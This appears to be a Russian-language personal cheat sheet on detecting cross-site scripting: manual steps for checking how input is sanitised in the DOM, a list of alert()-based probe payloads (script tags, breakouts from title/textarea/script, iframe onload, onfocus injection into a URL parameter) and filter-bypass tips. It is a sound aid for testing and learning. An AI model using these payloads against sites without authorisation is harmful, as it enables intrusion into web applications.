## DETECT

### XSS - методология
- payload во все поля/параметры
- смотреть DOM на предмет санитизации
- в каком-то месте спец.символы не перекодируются/alert выполнится

<ins>Порядок проверки на XSS</ins><br>
- вставить qweqwe в поле ввода
- F12 -> CTRL+F -> qweqwe
- добавить qweqwe'"><  <br>
посмотреть как происходит санитизация символов (ПКМ -> edit as HTML).
Если символ не преобразуется, то возможно его использование.
- далее проверять DOM-структуру при вводе строк с символами <br>
Возможные варианты строк для вставки:
```
<script>alert('XSS')</script>
'">/<script>alert('XSS')</script>

(по ситуации)
</title>...
</script>...
</noscript>...
</textarea>...

(если alert() не срабатывает, хз почему но такое есть), то
<iframe onload="alert('XSS')">
'"></title></script><iframe onload='alert('XSS')'>
(есть атрибут <iframe srcdoc=""> но надо разобраться)

<script>alert('XSS')</script>
<script>alert('XSS')</script>

/page.php?name='%20autofocus%20onfocus='alert();
(onfocus не будет работать если у тэга input есть аттрибут type=hidden)

/page.php?name=";+alert();//
```

<ins>Плюсы <b>iframe</b></ins><br>
- легко заметить, но payload встраивается в страницу, но на onload работают санитайзеры
- есть аттрибут srcdoc
- не раскрутить XSS - есть почти гарантированный open redirect

Пробелы можно заменить на / и теги можно не закрывать, браузер сам их закроет.
Тег  <!-- коментирует все, что идет после него 